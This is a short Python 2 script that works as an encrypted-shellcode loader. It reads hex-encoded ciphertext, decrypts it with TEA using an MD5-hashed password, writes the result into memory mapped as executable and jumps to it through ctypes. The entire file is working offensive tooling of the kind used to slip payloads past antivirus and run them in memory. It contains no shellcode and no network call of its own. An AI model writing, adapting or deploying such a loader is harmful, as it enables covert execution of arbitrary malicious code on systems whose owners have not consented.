#!/usr/bin/env python2
import os, sys, hashlib, struct, binascii, getpass
from ctypes import c_uint32



def Argv_Bytestr(param):
	this=param.replace("\\x", "").replace("0x", "").replace(",","").replace(" ","")
	bytes = []
	for i in range(0, len(this), 2):
		bytes.append(chr(int(this[i:i+2],16)))
	return ''.join(bytes)


def exec_sc_hook(sc):
	import ctypes, mmap
	mm = mmap.mmap(
		-1, 
		len(sc), 
		flags=mmap.MAP_SHARED | mmap.MAP_ANONYMOUS, 
		prot=mmap.PROT_WRITE | mmap.PROT_READ | mmap.PROT_EXEC
	)
	mm.write(sc)
	restype = ctypes.c_int32
	argtypes = tuple()
	sc_buf = ctypes.c_int.from_buffer(mm)
	sc_fnptr = ctypes.CFUNCTYPE(restype, *argtypes)(ctypes.addressof(sc_buf))
	sc_fnptr()



def XOR(alpha, beta, charlie):
	return c_uint32(c_uint32(c_uint32(alpha).value ^ c_uint32(beta).value).value ^ c_uint32(charlie).value).value

def add(alpha, beta):
	return c_uint32(c_uint32(alpha).value + c_uint32(beta).value).value

def subt(alpha, beta):
	return c_uint32(c_uint32(alpha).value - c_uint32(beta).value).value

def shift_L(alpha, beta):
	return c_uint32(c_uint32(alpha<<4).value + c_uint32(beta).value).value

def shift_R(alpha, beta):
	return c_uint32(c_uint32(alpha>>5).value + c_uint32(beta).value).value



def decrypt(v, k):
	plainT = bytearray()
	cipherT = bytearray(v)
	key = []
	keys = []
	for x in range(0, len(k), 2):
		key.append(int(k[x:x+2], 16))
	for item in range(0, 16, 4):
		this = ''.join([ chr(x) for x in key[item:item+4] ])
		keys.append(c_uint32(struct.unpack("I", this)[0]).value) 
	for point in range(0, len(cipherT), 8):
		summ = c_uint32(0xc6ef3720).value
		delta = c_uint32(0x9e3779b9).value
		v0 = c_uint32(struct.unpack("I", ''.join([ chr(x) for x in cipherT[point:point+4]]))[0]).value
		v1 = c_uint32(struct.unpack("I", ''.join([ chr(x) for x in cipherT[point+4:point+8]]))[0]).value
		for z in range(0,32):
			v1 = subt(v1, XOR(shift_L(v0, keys[2]), add(v0, summ), shift_R(v0, keys[3])))
			v0 = subt(v0, XOR(shift_L(v1, keys[0]), add(v1, summ), shift_R(v1, keys[1])))
			summ = c_uint32(c_uint32(summ).value - c_uint32(delta).value).value
		plainT +=  struct.pack("I", v0)
		plainT +=  struct.pack("I", v1)
	# plain = "\\x"
	# plain += '\\x'.join("%02x" % x for x in plainT)
	plain = str(bytearray(plainT))
	return plain


def main():
	NARGS=len(sys.argv)


	# hash encryption key
	hashl = hashlib.md5()
	if NARGS == 3: 
		hashl.update(sys.argv[2])
	else: 
		hashl.update(getpass.getpass())
	key=hashl.hexdigest()
	output = ""


	# get shellcode
	if NARGS >= 2:
		ciphertext = Argv_Bytestr(sys.argv[1])
	else:
		ciphertext = Argv_Bytestr(raw_input("[#] Enter encrypted shellcode:\n"))


	# decrypt shellcode
	output += decrypt(ciphertext, key)


	# execute shellcode
	exec_sc_hook(output)

	
if __name__=="__main__":
	main()

